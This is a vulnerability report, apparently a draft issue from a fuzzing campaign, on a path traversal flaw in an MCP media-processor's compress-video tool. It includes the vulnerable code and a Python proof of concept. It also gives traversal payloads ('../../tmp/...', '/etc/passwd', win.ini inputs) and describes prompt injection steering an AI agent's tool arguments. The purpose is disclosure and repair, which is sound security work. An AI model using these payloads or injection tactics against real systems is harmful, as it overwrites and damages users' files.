# Path traversal in `compress-video`: `outputFilename` escapes the Downloads folder and `outputPath` overwrites files anywhere

**Repository:** `maoxiaoke/mcp-media-processor` · **Tool:** `compress-video` · **Tested commit:** `2aecf0f`
**Weakness:** CWE-22 Path Traversal

## Summary
`compress-video` re-encodes a video with ffmpeg (`libx264`, caller-chosen CRF) and saves the result. When `outputPath` is omitted the output is meant to land in `~/Downloads`, but `outputFilename` is joined onto that folder without any check, so `../` sequences place the file anywhere. `outputPath` is used as given: missing parent directories are created and an existing file at that path is replaced without warning.

## Details
All ten tools in `src/index.ts` build their paths with two shared helpers. `getAbsolutePath` (lines 30-44) returns any absolute path unchanged and resolves relative paths against `process.cwd()`. `getOutputPath` (lines 47-62) never checks the result against a root. Excerpt (comments removed), followed by the handler:

```ts
  if (!outputPath) {
    await ensureDirectoryExists(downloadsPath);
    return join(downloadsPath, defaultFilename);
  }
  const absoluteOutputPath = isAbsolute(outputPath) ? outputPath : resolve(process.cwd(), outputPath);
  const outputDir = dirname(absoluteOutputPath);
  await ensureDirectoryExists(outputDir);
  return absoluteOutputPath;
// ... compress-video handler, lines 194-200:
      const defaultFilename = outputFilename || `${inputFileName}_compressed.mp4`;
      const finalOutputPath = await getOutputPath(outputPath, defaultFilename);
      const command = ffmpeg(absoluteInputPath)
        .videoCodec('libx264')
        .addOption('-crf', quality.toString())
        .save(finalOutputPath);
```

`join('~/Downloads', '../../x.mp4')` normalizes to a path outside `~/Downloads`. A caller `outputPath` is accepted as is, and `ensureDirectoryExists` (lines 21-27) runs `fs.mkdir(..., { recursive: true })` on its parent. fluent-ffmpeg adds `-y` whenever the output is a file (`lib/processor.js` in fluent-ffmpeg 2.1.3), so ffmpeg replaces an existing file without asking. The input comes from `getAbsolutePath(inputPath)` at line 192.

## Steps to reproduce
1. Prerequisites: Node.js 18+, FFmpeg with `libx264` on `PATH`. No accounts or env vars. Create test files:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=2:size=64x64:rate=10 -pix_fmt yuv420p /tmp/tofu-in.mp4
   printf 'original content\n' > /tmp/tofu-poc.mp4
   ```
2. Install and start from a checkout:
   ```bash
   git clone https://github.com/maoxiaoke/mcp-media-processor.git
   cd mcp-media-processor && npm install && npm run build
   # server entry point: node build/index.js
   ```
3. Call the tool twice. Call A (escape from `~/Downloads` via `outputFilename`):
   ```json
   {"inputPath": "/tmp/tofu-in.mp4", "quality": 30, "outputFilename": "../../../../../../../../tmp/tofu-poc-escape.mp4"}
   ```
   Call B (silent overwrite via `outputPath`):
   ```json
   {"inputPath": "/tmp/tofu-in.mp4", "quality": 30, "outputPath": "/tmp/tofu-poc.mp4"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   CALLS = [
       {"inputPath": "/tmp/tofu-in.mp4", "quality": 30,
        "outputFilename": "../../../../../../../../tmp/tofu-poc-escape.mp4"},
       {"inputPath": "/tmp/tofu-in.mp4", "quality": 30,
        "outputPath": "/tmp/tofu-poc.mp4"},
   ]

   async def main():
       server = StdioServerParameters(command="node", args=["build/index.js"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               for arguments in CALLS:
                   result = await session.call_tool("compress-video", arguments)
                   print(result)

   asyncio.run(main())
   ```
4. Observe: call A reports `Video successfully compressed and saved to: /tmp/tofu-poc-escape.mp4` and the file exists there, not under `~/Downloads`. After call B, `cat /tmp/tofu-poc.mp4` no longer prints `original content`; the file now holds video data.

## Expected behavior
`outputFilename` is treated as a bare file name and the result stays inside `~/Downloads`. If `outputPath` is supported, it is confined to an allowed root, and an existing file is not replaced unless the caller explicitly asks for it.

## Actual behavior
Any `outputFilename` or `outputPath` is accepted, parent directories are created, and existing files are overwritten. ffmpeg was not installed in the fuzzing sandbox, so no file was written there. One recorded call shows the server creating a directory chosen only by the caller: input `{"inputPath": "/etc/passwd\x00", "quality": 51, "outputPath": "/home/user/Downloads/", "outputFilename": "passwd.mp4"}` returned

```
Error compressing video: ENOENT: no such file or directory, mkdir '/home/user'
```

i.e. `getOutputPath` accepted the absolute `outputPath` and called `mkdir` on its parent (the sandbox had no `/home`). The overwrite and the Downloads escape are from reading the code at the tested commit.

## Impact
Tool arguments are chosen by the LLM, and prompt injection in content the agent reads can steer them. An attacker can make the agent overwrite any file the user can write (dotfiles, project files, documents) with video data, or drop files and create directories in arbitrary locations. The written bytes are the encoded video, not attacker-chosen text, so this is mainly an integrity and availability problem. Reading arbitrary input videos is documented behavior ("Absolute path to input video file").

## Suggested fix
- In `getOutputPath`, reject an `outputFilename` that is not a plain file name (`path.basename(name) !== name`, or contains `..`).
- Resolve the final path and require it to stay under an allowed root, e.g. `const p = path.resolve(root, name); if (!p.startsWith(root + path.sep)) throw ...`. If `outputPath` must stay, confine it to a configurable list of roots and check the `fs.realpath` of the parent directory.
- Refuse to overwrite an existing file unless an explicit `overwrite: true` is passed (check before calling ffmpeg, since fluent-ffmpeg always passes `-y`).
- Only create directories inside the allowed root.
- The helpers are shared, so one fix covers all ten tools.

## Status on the default branch
Still present at `2aecf0f` (2025-02-20). The tested commit is the current head of the default branch.

## Prior reports
- #7 "Security Vulnerability: Command Injection in multiple mcp-media-processor tools due to unsafe use of child_process.execSync" (issue, open 2026-04-23): related only. It reports shell injection in the six ImageMagick tools, not this FFmpeg tool (which uses `fluent-ffmpeg`, not `execSync`), and it does not mention the `../` escape from `~/Downloads` in the shared `getOutputPath` helper. No fix has been merged.
- Documentation: README.md: "`inputPath` (string): Absolute path to input video file" and "`outputPath` (string, optional): Custom output path" (arbitrary input and output locations are documented; nothing says `outputFilename` may contain directories, and there is no allowed-root setting or warning about untrusted input).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal; `check_path_traversal` only ("Silent Bug Alert": the input matched a traversal pattern and the tool returned without an exception).
- Campaigns and executions: corpus-sbx 3584 exec / 611 ok; e2-0922 1536 exec / 289 ok (60 s budget each).
- Evidence (verbatim, trimmed), corpus-sbx:
  - `{'inputPath': '../../../../etc/passwd', 'quality': 23, 'outputPath': '/tmp/output.mp4', 'outputFilename': 'output.mp4'}` -> `Error compressing video: Input file not found: ../../../../etc/passwd`
  - `{'inputPath': '/etc/passwd\x00', 'quality': 51, 'outputPath': '/home/user/Downloads/', 'outputFilename': 'passwd.mp4'}` -> `Error compressing video: ENOENT: no such file or directory, mkdir '/home/user'`
  - `{'inputPath': '..\\..\\..\\..\\windows\\win.ini', 'quality': 1, 'outputPath': '/var/tmp/evil.mp4', 'outputFilename': 'evil.mp4'}` -> `Error compressing video: Input file not found: ..\\..\\..\\..\\windows\\win.ini`
- Hand-check hints: real at code level, low-medium severity. The mkdir evidence confirms a caller `outputPath` reaches `fs.mkdir` unchecked; no write was observed because ffmpeg was absent. The `-y` claim was checked in the fluent-ffmpeg 2.1.3 copy under `eval/sandbox/targets/maoxiaoke__mcp-media-processor/node_modules` (`lib/processor.js:246`). Arbitrary absolute paths are documented, so the maintainer may call that part by design; the Downloads escape and the silent overwrite are the strongest points. Same root cause in all ten tools; consider one combined issue. Not run by us.
</details>
